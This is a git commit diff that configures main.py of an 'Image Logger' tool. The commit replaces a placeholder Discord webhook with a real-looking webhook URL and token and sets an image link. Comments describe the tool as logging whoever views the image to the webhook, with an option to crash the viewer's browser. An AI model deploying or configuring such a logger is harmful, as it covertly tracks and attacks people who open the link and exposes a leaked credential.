1a8f5296ebdcda64f0dbff7b98d899b7fc129750
kaylpogi <168406710+kaylpogi@users.noreply.github.com>
2024-07-09 13:51:03 +0800

    Update main.py

--- main.py
+++ main.py
@@ -12,14 +12,14 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1260110406412931183/5jtHz-xNnDUbSDOBgECU_KQ0z92lBY3_u_a_rJ53TytZGPnrBE7ulKGzFZ5TTewMr1Ti",
+    "image": "https://images.app.goo.gl/4frejhpMySeZB1Xy9", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
